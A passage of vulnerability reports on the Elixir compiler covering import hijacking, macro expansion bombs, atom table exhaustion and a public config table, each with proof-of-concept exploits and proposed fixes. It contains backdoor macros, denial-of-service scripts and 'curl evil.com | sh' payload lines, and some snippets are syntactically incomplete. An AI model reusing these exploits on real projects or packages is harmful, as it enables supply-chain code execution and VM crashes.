  export in a dependency prevents any module that imports it with
  `only: :sigils` from compiling.
- Supply chain attack: a malicious Hex package can include an
  innocuous-looking module with a carefully named function. The
  crash only manifests when the victim uses `import ..., only: :sigils`,
  which may not occur during the dependency's own test suite.
- CI/CD disruption: builds fail with an opaque Erlang-level error
  that does not indicate the root cause.
- The crash affects `filter_sigils/1` which is called for BOTH
  `import_sigil_functions` and `import_sigil_macros`, so both code
  paths are vulnerable.
- The error is a runtime exception in the compiler, not a controlled
  compile error, so it bypasses Elixir's error reporting infrastructure.

Root Cause
----------
Non-exhaustive pattern match in the inner `case Letters of` within
`is_sigil/1`. The function assumes sigil names after "sigil_" will be
either: empty, a single lowercase letter, or start with an uppercase
letter. It does not handle multi-character names starting with lowercase,
names starting with digits, or single non-letter characters. Any of
these cause a `case_clause` exception.

Fix
---
Add a catch-all clause to the inner case expression:

    is_sigil({Name, 2}) ->
      case atom_to_list(Name) of
        "sigil_" ++ Letters ->
          case Letters of
            [L] when L >= $a, L =< $z -> true;
            [] -> false;
            [H|T] when H >= $A, H =< $Z ->
                  lists:all(fun(L) -> (L >= $0 andalso L =< $9)
                                      orelse (L >= $A andalso L =< $Z)
                            end, T);
            _ -> false    %% <-- ADD THIS: catch-all returns false
          end;
        _ ->
          false
      end;
    is_sigil(_) ->
      false.

The catch-all `_ -> false` ensures that any unexpected sigil name format
is simply not treated as a sigil, rather than crashing the compiler.

Vulnerability: Arbitrary Import Hijacking and Compile-Time Code Execution via Untrusted AST Metadata in Dispatch - not a bug?
=================================================================================================================

File: lib/elixir/src/elixir_dispatch.erl, lines 234-239 and 310-343
Severity: Critical (Arbitrary Code Execution at Compile Time / Function Call Redirection)

Description
-----------
The dispatch pipeline in elixir_dispatch.erl unconditionally trusts two
AST metadata keys — `imports` and `required` — to override the compiler
environment's actual import and require state. A malicious macro can craft
AST nodes with these metadata keys to:

1. Redirect any function call to an arbitrary module (import hijacking)
2. Force macro expansion in any module without it being required (compile-time RCE)

Both attacks are invisible in the victim's source code: the function call
looks normal, but the metadata (which is not displayed) silently overrides
the dispatch target.

Vulnerable Code Path 1: Import Hijacking via is_import/2 (lines 310-343)
--------------------------------------------------------------------------
The find_import_by_name_arity/4 function checks AST metadata FIRST, before
consulting the environment's actual import list:

    find_import_by_name_arity(Meta, {_Name, Arity} = Tuple, Extra, E) ->
      case is_import(Meta, Arity) of
        {import, _} = Import ->
          Import;                    %% <-- metadata overrides environment
        false ->
          Funs = ?key(E, functions),
          Macs = Extra ++ ?key(E, macros),
          ...normal resolution from E...
      end.

The is_import/2 function (lines 331-343) extracts the dispatch target
directly from untrusted metadata:

    is_import(Meta, Arity) ->
      case lists:keyfind(imports, 1, Meta) of
        {imports, [_ | _] = Imports} ->
          case lists:keyfind(context, 1, Meta) of
            {context, _} ->
              case lists:keyfind(Arity, 1, Imports) of
                {Arity, Receiver} -> {import, Receiver};  %% Receiver from metadata!
                false -> false
              end;
            false -> false
          end;
        _ -> false
      end.

When metadata contains `imports: [{Arity, AttackerModule}]` and
`context: SomeModule`, the function returns `{import, AttackerModule}`,
completely bypassing the environment's import list (E.functions and
E.macros).

This result flows to do_expand_import/7 (line 218-224):

    {import, Receiver} ->
      case expand_require(true, Meta, Receiver, Name, Arity, E, Trace) of
        {macro, _, _} = Response -> Response;    %% macro in AttackerModule expands
        error ->
          {function, Receiver, Name}             %% runtime call to AttackerModule.Name
      end;

If AttackerModule defines a macro with the target name/arity, it is
expanded at compile time (arbitrary code execution). Otherwise, the call
is dispatched as a runtime function call to AttackerModule.

Vulnerable Code Path 2: Require Bypass via `required` Metadata (lines 234-239)
---------------------------------------------------------------------------------
The expand_require/6 function also trusts AST metadata to determine if a
module is required:

    expand_require(Meta, Receiver, Name, Arity, E, Trace) ->
      Required = (Receiver == ?key(E, module))
        orelse (lists:keyfind(required, 1, Meta) == {required, true})
        orelse is_element(Receiver, ?key(E, requires)),
      expand_require(Required, Meta, Receiver, Name, Arity, E, Trace).

If metadata contains `{required, true}`, the module is treated as
required regardless of the actual requires list in the environment. This
enables macro expansion in ANY module without the victim ever writing
`require AttackerModule`.

Combined Exploit
-----------------
A malicious macro in a Hex dependency can combine both vulnerabilities to
achieve invisible compile-time code execution:

    defmodule Innocent.Helpers do
      # Backdoor module that will be invoked via metadata injection
      defmacro helper(arg) do
        # This executes at compile time in the VICTIM's project
        Code.eval_string(System.get_env("PAYLOAD") || "nil")
        arg  # Return the arg unchanged to avoid suspicion
      end

      # Public macro that victims will use - looks completely benign
      defmacro safe_log(message) do
        # Generate AST that looks like a normal function call but
        # has metadata that redirects to our backdoor macro
        meta = [
          imports: [{1, Innocent.Helpers}],   # hijack dispatch
          context: Innocent.Helpers,           # satisfy context check
          required: true                       # bypass require check
        ]

        # The victim sees "helper(message)" which looks like a
        # local function call, but metadata redirects to our macro
        {:helper, meta, [message]}
      end
    end

    # Victim's code - looks completely harmless
    defmodule MyApp.Logger do
      require Innocent.Helpers

      def log(msg) do
        Innocent.Helpers.safe_log(msg)
        # Expands to what LOOKS like helper(msg) - a local call
        # But metadata redirects it to Innocent.Helpers.helper/1 macro
        # which executes arbitrary code at compile time
      end
    end

The victim only sees `Innocent.Helpers.safe_log(msg)` in their source.
The generated AST contains metadata that is invisible in code review,
error messages, and most debugging tools. The redirection to the backdoor
macro happens silently during compilation.

A more stealthy variant hijacks calls to well-known standard library
functions:

    defmacro setup() do
      meta = [
        imports: [{2, Evil.Backdoor}],
        context: Evil.Backdoor
      ]
      # Generates what looks like Enum.map(list, fun)
      # but actually calls Evil.Backdoor.map(list, fun) at runtime
      {:map, meta, [quote(do: [1,2,3]), quote(do: &IO.inspect/1)]}
    end

Impact
------
- Arbitrary code execution at compile time: a malicious macro can force
  expansion of attacker-controlled macros in arbitrary modules, executing
  with full privileges of the compiling process (file system access,
  network, process spawning).
- Invisible function call redirection: runtime function calls can be
  silently redirected to attacker-controlled modules. The victim's source
  code shows one call target, but the compiled code calls another.
- Bypasses all normal import/require safety checks: the import hijack
  skips the environment's import list entirely; the require bypass skips
  the requires list. No `import` or `require` statement for the attacker's
  module appears anywhere in the victim's code.
- Undetectable in code review: AST metadata is not displayed in source
  code, most error messages, or standard debugging tools. The attack is
  invisible unless the reviewer manually inspects expanded AST with
  Macro.expand and examines metadata.
- Supply chain attack vector: a malicious Hex dependency only needs to
  export a single macro. Any project that uses the macro gets the
  metadata injection. Unlike direct `__escape__/1` or ETS attacks, this
  requires no background processes or unusual module callbacks — just a
  normal-looking macro.
- Affects all code paths through dispatch_import and dispatch_require:
  local calls, qualified calls, and any code that compiles Elixir
  (Mix, IEx, LiveBook, Code.eval_string, etc.).

Root Cause
----------
1. The is_import/2 function (lines 331-343) reads the `imports` key from
   AST metadata and returns its value as the dispatch target without
   validating that the claimed module is actually in the environment's
   import list (E.functions or E.macros).
2. The expand_require/6 function (line 236) trusts `{required, true}` in
   AST metadata to bypass the environment's require check, allowing macro
   expansion in non-required modules.
3. The find_import_by_name_arity/4 function (line 311-313) checks metadata
   BEFORE the environment, meaning metadata always takes precedence over
   the legitimate import state.
4. There is no validation anywhere in the dispatch pipeline that the
   Receiver from metadata matches any module in the compilation
   environment's imports or requires.

Fix
---
Option 1 - Validate metadata imports against the environment:

    is_import(Meta, Arity, E) ->
      case lists:keyfind(imports, 1, Meta) of
        {imports, [_ | _] = Imports} ->
          case lists:keyfind(context, 1, Meta) of
            {context, _} ->
              case lists:keyfind(Arity, 1, Imports) of
                {Arity, Receiver} ->
                  %% Verify Receiver is actually imported in the environment
                  Funs = ?key(E, functions),
                  Macs = ?key(E, macros),
                  case lists:keyfind(Receiver, 1, Funs) =/= false
                    orelse lists:keyfind(Receiver, 1, Macs) =/= false of
                    true -> {import, Receiver};
                    false -> false
                  end;
                false -> false
              end;
            false -> false
          end;
        _ -> false
      end.

Option 2 - Remove metadata trust for the `required` key:

    expand_require(Meta, Receiver, Name, Arity, E, Trace) ->
      Required = (Receiver == ?key(E, module))
        orelse is_element(Receiver, ?key(E, requires)),
      %% Remove: orelse (lists:keyfind(required, 1, Meta) == {required, true})
      expand_require(Required, Meta, Receiver, Name, Arity, E, Trace).

Option 3 - Strip or ignore `imports`, `context`, and `required` metadata
keys that did not originate from the compiler's own macro hygiene system
(e.g., by using a compiler-internal key format that cannot be forged by
user macros).

Vulnerability: Exponential Compiler Bomb via Unbounded Recursive Macro Expansion in expand/3 Loop
===================================================================================================

File: lib/elixir/src/elixir_expand.erl, lines 504-513 (local calls) and 517-523 (remote calls)
Related: lib/elixir/src/elixir_dispatch.erl, lines 119-122 and 151-155 (expand_quoted callback)
Severity: High (Denial of Service - exponential compiler resource exhaustion)

Description
-----------
The core `expand/3` function in elixir_expand.erl serves as the main AST
expansion loop for the Elixir compiler. When it encounters a local or
remote call that resolves to a macro, the call is dispatched through
elixir_dispatch:dispatch_import/6 or dispatch_require/7, which invoke the
macro and then call expand_quoted/7 to re-expand the macro's output. The
expand_quoted function (elixir_dispatch.erl line 277) calls BACK into
elixir_expand:expand/3 with NO depth counter or recursion limit:

    expand_quoted(Meta, Receiver, Name, Arity, Quoted, S, E) ->
      Next = elixir_module:next_counter(?key(E, module)),
      try
        ToExpand = elixir_quote:linify_with_context_counter(Meta, {Receiver, Next}, Quoted),
        elixir_expand:expand(ToExpand, S, E)      %% <-- unbounded recursion
      catch
        Kind:Reason:Stacktrace -> ...
      end.

When the re-expanded result contains further macro calls, the cycle
repeats: expand -> dispatch -> macro execution -> expand_quoted -> expand.
There is no expansion depth counter anywhere in this loop.

The triggering code path in elixir_expand.erl (lines 504-513):

    expand({Atom, Meta, Args}, S, E) when is_atom(Atom), is_list(Meta), is_list(Args) ->
      assert_no_ambiguous_op(Atom, Meta, Args, S, E),
      elixir_dispatch:dispatch_import(Meta, Atom, Args, S, E, fun
        ({AR, AF}) ->
          expand_remote(AR, Meta, AF, Meta, Args, S, elixir_env:prepare_write(S, E), E);
        (local) ->
          expand_local(Meta, Atom, Args, S, E)
      end);

And for remote calls (lines 517-523):

    expand({{'.', DotMeta, [Left, Right]}, Meta, Args}, S, E) ... ->
      {ELeft, SL, EL} = expand(Left, elixir_env:prepare_write(S, E), E),
      elixir_dispatch:dispatch_require(Meta, ELeft, Right, Args, S, EL, fun(AR, AF) ->
        expand_remote(AR, DotMeta, AF, Meta, Args, S, SL, EL)
      end);

When a macro is found, dispatch_import calls (line 122):

    expand_quoted(Meta, Receiver, Name, Arity, Expander(stop_generated(Args), Caller), S, E);

The macro's return value is expanded by elixir_expand:expand/3 with no
depth tracking. If the expanded result contains more macro calls, each
is expanded recursively.

Exploit (Exponential Compiler Bomb)
------------------------------------
A macro that expands to an expression containing TWO calls to itself
creates exponential growth -- a billion-laughs style attack:

    defmodule Bomb do
      defmacro boom do
        quote do: boom() + boom()
      end
    end

    defmodule Victim do
      import Bomb
      def f, do: boom()    # triggers the vulnerability
    end

Expansion trace through expand/3:
  Step 0: boom()                                       (1 macro call)
  Step 1: boom() + boom()                              (2 macro calls)
  Step 2: (boom() + boom()) + (boom() + boom())        (4 macro calls)
  Step 3: ...                                          (8 macro calls)
  Step N: ...                                          (2^N macro calls)

The expand/3 function processes the `+` operator's arguments sequentially
via mapfold in expand_remote (line 957):

    {EArgs, {SA, _}, EA} = mapfold(fun expand_arg/3, {SL, S}, E, Args),

Each argument is expanded independently, and each expansion triggers
the full macro expansion cycle. The call stack depth at any point is
O(N) (linear in nesting depth), but the TOTAL number of macro expansions
is O(2^N) (exponential). This means:

  After 30 levels: over 1 billion macro expansions
  After 40 levels: over 1 trillion macro expansions

The compiler consumes exponential CPU time, effectively hanging the
build process. The Erlang call stack does NOT overflow (it's only
N deep at any point), so no stack limit provides a natural bound --
the process runs until it exhausts CPU time or memory.

A more stealthy variant uses a library macro that expands to code with
a branching factor embedded in normal-looking function calls:

    defmodule Helpers do
      defmacro validate(x) do
        quote do
          case validate(unquote(x)) do
            {:ok, v} -> {:ok, validate(v)}
            {:error, e} -> {:error, validate(e)}
          end
        end
      end
    end

Each expansion of `validate` produces THREE recursive `validate` calls
(branching factor 3), giving 3^N total expansions. After just 20 levels:
3^20 = 3.5 billion expansions.

A linear infinite-loop variant also works with mutually recursive macros:

    defmodule Evil do
      defmacro a(), do: quote(do: b())
      defmacro b(), do: quote(do: a())
    end

    defmodule Victim do
      import Evil
      def f, do: a()   # infinite expansion: a -> b -> a -> b -> ...
    end

This variant grows the call stack linearly until process stack overflow.

Distinction from Bitstring Expansion Bomb (elixir_bitstring.erl)
-----------------------------------------------------------------
The previously reported bitstring vulnerability (expand_each_spec/6 in
elixir_bitstring.erl) operates on bitstring TYPE SPECIFIERS via
unpack_specs/2. It is triggered only in `<<>>` expressions with custom
type specifier macros.

This vulnerability operates on the GENERAL macro expansion pipeline
through the core expand/3 function. It affects ALL macro calls in ALL
contexts: function bodies, module attributes, pattern matches, guards,
comprehensions, and any other code that goes through expand/3. The
attack surface is vastly larger.

Impact
------
- Denial of Service against the Elixir compiler from a single macro call.
  The exponential variant hangs the compiler indefinitely without stack
  overflow, making it harder to detect than a crash.
- Supply chain attack vector: a compromised Hex package containing such
  a macro would DoS any project that uses it. The macro only needs to be
  called once -- it can appear in a seemingly benign helper function that
  the victim imports and uses.
- CI/CD disruption: automated build pipelines hang indefinitely or
  consume unbounded CPU/memory. Unlike a crash, a hang may not trigger
  timeout alerts for a long time.
- The attack surface includes any code path that compiles Elixir:
  Mix, Code.eval_string, IEx, LiveBook, and any tool that expands macros.
- Unlike the bitstring variant, this affects ALL macro calls, not just
  bitstring type specifiers, making it far more broadly exploitable.
- The linear (stack overflow) variant produces an opaque Erlang-level
  system_limit error that gives no indication of the root cause.

Root Cause
----------
Missing expansion depth limit in the macro expansion loop between
elixir_expand:expand/3 and elixir_dispatch:expand_quoted/7. The
expand/3 function accepts and re-expands macro output without tracking
how many expansion rounds have occurred. No depth counter is maintained
in the S (elixir_ex) state record or the E (environment) map.

Fix
---
Add a macro expansion depth counter to the compiler state or environment.
Increment it in expand_quoted before calling elixir_expand:expand, and
check it at the start of expansion:

    %% In elixir_dispatch.erl, expand_quoted:
    expand_quoted(Meta, Receiver, Name, Arity, Quoted, S, E) ->
      Depth = S#elixir_ex.macro_depth,
      case Depth > ?MAX_MACRO_DEPTH of
        true ->
          elixir_errors:file_error(Meta, E, ?MODULE, max_macro_expansion_depth);
        false ->
          Next = elixir_module:next_counter(?key(E, module)),
          try
            ToExpand = elixir_quote:linify_with_context_counter(
              Meta, {Receiver, Next}, Quoted),
            elixir_expand:expand(
              ToExpand,
              S#elixir_ex{macro_depth=Depth + 1},
              E)
          catch
            Kind:Reason:Stacktrace -> ...
          end
      end.

    -define(MAX_MACRO_DEPTH, 100).

The counter should be decremented (or restored) after each successful
expansion so that deeply nested but non-recursive code is not affected.
A reasonable limit (e.g., 100) would catch both exponential and linear
recursive expansion while allowing all legitimate macro use cases.

Vulnerability: Unbounded Atom Creation in Tokenizer unsafe_to_atom Enables VM-Wide Crash via Atom Table Exhaustion
====================================================================================================================

File: lib/elixir/src/elixir_tokenizer.erl, lines 1057-1147 (unsafe_to_atom/4) and 1666-1667 (keyword_or_unsafe_to_atom fallthrough)
Severity: Critical (Denial of Service - entire BEAM VM crash, not just process)

Description
-----------
The `unsafe_to_atom/4` function in elixir_tokenizer.erl is the PRIMARY
atom creation point for the entire Elixir compilation pipeline. It is
called for EVERY token that becomes an atom during tokenization:

  - Every identifier (variable names, function names): line 1666-1667
    via keyword_or_unsafe_to_atom fallthrough
  - Every quoted atom (:"foo"): line 533
  - Every quoted keyword argument ("foo": value): line 830
  - Every quoted dot-call (foo."bar"()): line 978
  - Every multi-letter sigil name (~SIGIL): line 1785

When `existing_atoms_only=false` (the DEFAULT for all standard compilation
paths), the function calls `binary_to_atom(Binary, utf8)` (line 1105) or
`list_to_atom(List)` (line 1135) for every unique token. These Erlang BIFs
create permanent atoms that are NEVER garbage collected.

The atom table in the BEAM VM has a hard limit (default: 1,048,576 atoms).
Once exhausted, the ENTIRE VM terminates -- not just the offending process,
but ALL processes on the node (web servers, database connections, background
jobs, supervisors). This is an unrecoverable fatal error.

The vulnerable code paths:

    %% Line 1103-1106: Default path for binary atom names
    unsafe_to_atom(Binary, Line, Column, #elixir_tokenizer{}) when is_binary(Binary) ->
      try
        {ok, binary_to_atom(Binary, utf8)}    %% Creates PERMANENT atom
      catch ...

    %% Line 1133-1136: Default path for list atom names
    unsafe_to_atom(List, Line, Column, #elixir_tokenizer{}) when is_list(List) ->
      try
        {ok, list_to_atom(List)}              %% Creates PERMANENT atom
      catch ...

    %% Line 1666-1667: ALL identifiers fall through to unsafe_to_atom
    keyword_or_unsafe_to_atom(_, Part, Line, Column, Scope) ->
      unsafe_to_atom(Part, Line, Column, Scope).

There is NO atom creation budget, NO counter, NO rate limiting, and NO
check against the current atom table capacity before creating atoms.

Distinction from Parser Vulnerability (elixir_parser.erl)
----------------------------------------------------------
The previously reported parser vulnerability focuses on `build_quoted_atom`
in elixir_parser.erl, which handles only QUOTED atom tokens (atom_safe,
atom_unsafe). The tokenizer vulnerability is fundamentally different:

1. SCOPE: The tokenizer creates atoms for ALL token types -- identifiers,
   function names, module names, keyword arguments, sigils, AND atoms.
   The parser only handles the atom subset.

2. PRIMACY: The tokenizer runs FIRST. It is the root cause. The parser
   receives tokens that already had atoms created by the tokenizer.

3. ATTACK SURFACE: Any code path that tokenizes Elixir source is
   vulnerable, not just parsing. This includes Code.string_to_quoted/2,
   Code.eval_string/2, the compiler, IEx, LiveBook, and any tool that
   calls elixir_tokenizer:tokenize/3,4.

4. IDENTIFIER ATOMS: The most dangerous aspect is that UNQUOTED
   identifiers (variable names, function names) go through
   keyword_or_unsafe_to_atom (line 1666) which falls through to
   unsafe_to_atom. This means even code without any atom literals
   creates permanent atoms for every unique identifier name.

Exploit
-------
1. Direct atom exhaustion via unique identifiers:

    # Each unique variable/function name creates a permanent atom
    payload = Enum.map_join(1..1_500_000, "\n", fn i -> "var_#{i} = 1" end)
    Code.string_to_quoted(payload)    # VM crashes

   The tokenizer calls unsafe_to_atom for each "var_N" identifier,
   creating 1.5 million permanent atoms. Combined with the ~500K atoms
   already in the table from the Elixir/Erlang runtime, this exceeds
   the default 1,048,576 limit.

2. Supply chain attack via a dependency with many unique function names:

    # In malicious dependency (spread across many modules to avoid suspicion)
    defmodule Evil.Mod1 do
      # 1000 unique function names per module
      for i <- 1..1000 do
        def unquote(:"func_#{i}_#{:rand.uniform(999999)}")(), do: :ok
      end
    end
    # Repeat across 1000 modules = 1,000,000 unique atoms

   When the victim compiles the dependency, the tokenizer creates a
   permanent atom for each unique function name. The atoms persist
   across recompilations and accumulate over the VM's lifetime.

3. Incremental exhaustion via repeated Code.eval_string:

    # In a malicious dependency's Application.start callback:
    Task.start(fn ->
      Stream.iterate(0, &(&1 + 1))
      |> Stream.each(fn i ->
        Code.eval_string("x_#{i} = 1")
      end)
      |> Stream.run()
    end)

   Each eval_string tokenizes the source, creating a new atom via
   unsafe_to_atom. The background task slowly fills the atom table
   until the VM crashes. The attack is gradual and difficult to detect.

4. Atom exhaustion via quoted atoms in untrusted input:

    # LiveBook/IEx processing untrusted input
    input = Enum.map_join(1..2_000_000, " ", fn i -> ~s/:"a#{i}"/ end)
    Code.string_to_quoted(input)

   Each :"aN" is tokenized as a quoted atom, going through
   unsafe_to_atom at line 533. No quoted atom has the same name,
   so each creates a new permanent atom.

Impact
------
- Complete VM crash: atom table exhaustion terminates the ENTIRE BEAM
  VM with "no more index entries in atom_tab" or a similar fatal error.
  ALL processes die: web servers, databases, supervisors, everything.
- Not recoverable: there is no way to catch, trap, or recover from
  atom table exhaustion. It is a VM-level fatal error outside the
  scope of Erlang's error handling.
- Persistent resource leak: atoms created by the tokenizer persist
  for the lifetime of the VM. Even if the malicious code is removed,
  the atoms remain. Incremental recompilation, IEx sessions, and
  LiveBook evaluations gradually fill the table over time.
- Silent accumulation: there is no warning when the atom table
  approaches capacity. The VM appears to function normally until it
  suddenly crashes.
- Broad attack surface: EVERY code path that tokenizes Elixir source
  is affected. The tokenizer is the first stage of ALL Elixir
  compilation. Code.string_to_quoted, Code.eval_string, the compiler,
  IEx, LiveBook, and any tool that processes Elixir source.
- Supply chain attack: a malicious Hex dependency can exhaust the atom
  table simply by having many unique identifiers across its modules.
  No macros, no compile-time callbacks, no unusual patterns -- just
  normal-looking code with many unique function/variable names.
- Multi-tenant risk: in shared environments (LiveBook, shared dev
  servers, multi-app Erlang nodes), one tenant can crash the VM for
  all tenants by tokenizing source with many unique identifiers.

Root Cause
----------
The `unsafe_to_atom/4` function unconditionally creates new atoms via
`binary_to_atom/2` and `list_to_atom/1` when `existing_atoms_only=false`
(the default). There is no:
- Atom creation budget or counter per tokenization call
- Check against the current atom table capacity
- Rate limiting or throttling of atom creation
- Warning when the atom table is approaching its limit

The `existing_atoms_only=true` option exists but is opt-in and not the
default for any public API. The `static_atoms_encoder` callback (line
1067) provides a mechanism to avoid atom creation, but it is also opt-in
and rarely used.

The fundamental issue is that tokenization -- which should be a safe,
reversible operation -- permanently mutates global VM state (the atom
table) in an unbounded way. Every call to `unsafe_to_atom` with a new
identifier name irreversibly consumes a slot in the finite atom table.

Fix
---
Option 1 - Add an atom creation budget to the tokenizer state:

    -record(elixir_tokenizer, {
      ...
      atom_count=0,
      max_atoms=100000    %% configurable limit
    }).

    unsafe_to_atom(Part, Line, Column,
                   #elixir_tokenizer{atom_count=Count, max_atoms=Max}) when Count >= Max ->
      {error, {?LOC(Line, Column), "atom creation limit exceeded during tokenization: ", Part}};

    unsafe_to_atom(Binary, Line, Column,
                   #elixir_tokenizer{atom_count=Count} = Scope) when is_binary(Binary) ->
      try
        Atom = binary_to_atom(Binary, utf8),
        {ok, Atom, Scope#elixir_tokenizer{atom_count=Count+1}}
      catch
        error:badarg -> ...
      end.

    Note: This requires threading the updated Scope back through all callers,
    which is a significant refactor.

Option 2 - Use binary_to_existing_atom by default and require opt-in for
new atom creation:

    %% Change the default in elixir.hrl:
    -record(elixir_tokenizer, {
      ...
      existing_atoms_only=true,    %% was: false
      ...
    }).

    This is a breaking change but provides the secure default. Code paths
    that need to create new atoms (the compiler, Code.eval_string) can
    explicitly set existing_atoms_only=false.

Option 3 - Check atom table capacity before creating atoms:

    unsafe_to_atom(Binary, Line, Column, Scope) ->
      {CurrentCount, MaxCount} = erlang:system_info(atom_count),
      case CurrentCount > MaxCount * 0.9 of
        true ->
          {error, {?LOC(Line, Column), "atom table near capacity, refusing to create atom: ", ...}};
        false ->
          ...
      end.

    Note: erlang:system_info(atom_count) returns the current count, and
    erlang:system_info(atom_limit) returns the maximum. Checking before
    each atom creation adds overhead but prevents the fatal VM crash.

Vulnerability: Atom Table Exhaustion via Module.concat/1 (binary_to_atom)
=========================================================================

File: lib/elixir/src/elixir_aliases.erl, line 175
Severity: High (Denial of Service - BEAM VM crash via atom table exhaustion)

Description
-----------
The concat/1 function uses binary_to_atom/2 to convert the result of
do_concat/1 into an atom:

    concat(Args) -> binary_to_atom(do_concat(Args), utf8).

This function is the implementation of the public Elixir API Module.concat/1,
which accepts arbitrary lists of atoms, binaries, or strings representing module
name segments and joins them into a single module atom.

Atoms in the BEAM VM are never garbage collected and are stored in a fixed-size
atom table (default limit: 1,048,576). Each call to concat/1 with a unique input
creates a new permanent atom. If user-controlled data (e.g., from HTTP request
parameters, user-supplied configuration, deserialized data, or external input)
flows into Module.concat/1, an attacker can systematically exhaust the atom table
by sending distinct values, causing the entire BEAM VM to crash with a
"no more index entries in atom_tab" fatal error. This kills ALL processes on the
node, not just the offending one.

The vulnerable call chain:
  1. User-controlled binary/string reaches Module.concat/1
  2. concat/1 calls do_concat/1 which builds an "Elixir."-prefixed binary
  3. binary_to_atom/2 creates a permanent atom from that binary
  4. Each unique input permanently consumes one atom table slot
  5. After ~1M unique inputs, the VM crashes

Notably, a safe alternative already exists on line 176:

    safe_concat(Args) -> binary_to_existing_atom(do_concat(Args), utf8).

safe_concat/1 uses binary_to_existing_atom/2, which only succeeds if the atom
already exists, preventing atom table exhaustion. However, concat/1 is the
default and far more commonly used function in practice.

Additionally, list_to_atom/1 on line 113 in expand/5:

    Lookup = list_to_atom("Elixir." ++ atom_to_list(H)),

also creates atoms, though its input (H) is already an atom so the blast radius
is smaller. The same applies to list_to_atom on line 60 in expand_as/3.

Exploit
-------
Any Elixir application that passes user-controlled input to Module.concat/1 is
vulnerable. Example attack scenario:

    # In a Phoenix controller or plug that dynamically resolves modules:
    defmodule MyApp.DynamicController do
      def call(conn, _opts) do
        # User-controlled "handler" param flows into Module.concat
        handler = conn.params["handler"]
        module = Module.concat([MyApp.Handlers, handler])
        module.handle(conn)
      end
    end

    # Attacker sends ~1M requests with unique handler values:
    # GET /?handler=AAAA
    # GET /?handler=AAAB
    # GET /?handler=AAAC
    # ...
    # After ~1M unique values, the BEAM VM crashes entirely.

Impact
------
- Complete BEAM VM crash (not just the offending process)
- All applications on the node go down simultaneously
- No graceful degradation or recovery possible without VM restart
- The atom table persists across hot code reloads
- Attack requires only ~1M HTTP requests with unique strings

Remediation
-----------
Applications should use Module.safe_concat/1 instead of Module.concat/1 when
any input segment may originate from user-controlled data. At the language level,
the concat/1 function could be hardened by checking atom table utilization before
calling binary_to_atom:

    concat(Args) ->
      Bin = do_concat(Args),
      case erlang:system_info(atom_count) < erlang:system_info(atom_limit) - 1000 of
        true -> binary_to_atom(Bin, utf8);
        false -> error({atom_table_near_limit, Bin})
      end.

Alternatively, documentation for Module.concat/1 should prominently warn against
use with user-controlled input and recommend safe_concat/1 for those cases.

Vulnerability: Public ETS Table in elixir_config Allows Silent Compiler Configuration Tampering and Tracer Injection
=====================================================================================================================

File: lib/elixir/src/elixir_config.erl, line 46
Severity: Critical (Arbitrary Code Execution at Compile Time via Compiler Tracer Injection)

Description
-----------
The elixir_config ETS table is created with `public` access:

      Tab = ets:new(?MODULE, [named_table, public, {read_concurrency, true}]),
      true = ets:insert_new(?MODULE, Opts),
      Tab.

This table stores ALL Elixir compiler configuration, including security-
sensitive settings. Any Erlang process on the same node can directly read
AND write to this table, completely bypassing the gen_server serialization
that is supposed to control writes (lines 36-43).

The table stores the following exploitable configuration keys (set up in
lib/elixir/src/elixir.erl, lines 82-101):

  - {tracers, []}              — compiler tracer modules
  - {no_warn_undefined, []}    — suppresses undefined function warnings
  - {on_undefined_variable, raise} — controls behavior on undefined vars
  - {debug_info, true}         — whether debug info is included
  - {docs, true}               — whether docs are generated

  - {at_exit, []}              — at_exit callbacks

Attack Vector 1: Compiler Tracer Injection (Most Severe)
---------------------------------------------------------
Elixir's compiler tracer mechanism (Mix.Compilers.Elixir, Code.put_compiler_option/2)
allows modules to receive callbacks on every compilation event. Tracers are
read from the `tracers` config key and invoked by the compiler on events
like :remote_function, :imported_function, :remote_macro, :local_function,
:alias_reference, etc.

An attacker injects a malicious tracer:

    ets:insert(elixir_config, {tracers, [MaliciousTracer]}).

Where MaliciousTracer is a module that implements the tracer callbacks:

    defmodule MaliciousTracer do

        # Exfiltrate source code, modify compilation, inject backdoors
        send(attacker_pid(), {:source, env.file, env.line, {module, name, arity}})
        :ok
      end
      def trace(_event, _env), do: :ok
    end

The tracer executes at compile time in the compiler's process for every
module being compiled. It receives the full compilation environment
including file paths, module names, and function definitions.

Attack Vector 2: Warning Suppression
--------------------------------------
An attacker silently disables security-relevant compiler warnings:

    %% Suppress all undefined function warnings
    ets:insert(elixir_config, {no_warn_undefined, all}).

    %% Change undefined variable from error to warning (or ignore)
    ets:insert(elixir_config, {on_undefined_variable, warn}).

This masks indicators of compromise. If a supply chain attack introduces
calls to undefined or replaced functions, the warnings that would alert
the developer are silently suppressed.

Attack Vector 3: Debug Info and Docs Suppression
--------------------------------------------------
    ets:insert(elixir_config, {debug_info, false}).
    ets:insert(elixir_config, {docs, false}).

Disabling debug_info prevents post-compilation analysis tools from
inspecting the compiled modules. Disabling docs removes documentation
that might reference the original (pre-tampered) behavior.

Attack Vector 4: at_exit Callback Injection
---------------------------------------------

    ets:insert(elixir_config, {at_exit, [fun() -> os:cmd("curl evil.com/pwn") end | OldAtExit]}).

The at_exit callbacks are invoked when the Elixir application shuts down,
providing persistent code execution that survives compilation.

Attack Vector 5: Arbitrary Code Execution via serial/1
-------------------------------------------------------
Additionally, the exported serial/1 function (line 55-56) allows any
process to execute arbitrary functions inside the gen_server:

      gen_server:call(?MODULE, {serial, Fun}, infinity).

    handle_call({serial, Fun}, _From, State) ->
      {reply, Fun(), State};

Any process can call:

      os:cmd("curl https://evil.com/payload | sh")
    end).

If Fun() crashes, it takes down the gen_server, disrupting all subsequent
compiler configuration operations. If Fun() blocks, the infinity timeout
means all other config operations (put, update, get_and_put) are blocked
indefinitely — a denial of service against the compiler.

Timing and Attack Surface
--------------------------
The elixir_config table exists for the ENTIRE lifetime of the Elixir
application (created in elixir:start/2, deleted in elixir:stop/1). Unlike
per-module tables that exist only during compilation of a single module,
this table is a permanent, always-available attack surface.

Any code running on the same Erlang node can exploit this:
- Hex dependencies (compiled and loaded before the victim's code)
- Phoenix endpoints, plugs, or LiveView modules
- LiveBook code cells
- IEx sessions
- Release boot scripts
- Any OTP application on the same node

Impact
------
- Arbitrary code execution at compile time: injected tracers execute on
  every compilation event with access to full source file information.
- Silent exfiltration: tracers receive module names, function calls, and
  file paths for all code being compiled.
- Warning suppression: attacker can hide indicators of compromise by
  disabling undefined function/variable warnings.
- Persistent backdoor: at_exit callback injection survives compilation
  and executes at shutdown.
- Denial of service: serial/1 with a blocking or crashing function
  disables all compiler configuration operations.
- Supply chain attack: a malicious dependency only needs to write to the
  ETS table — no macros, callbacks, or compile-time hooks required. A
  simple background process started at load time is sufficient.
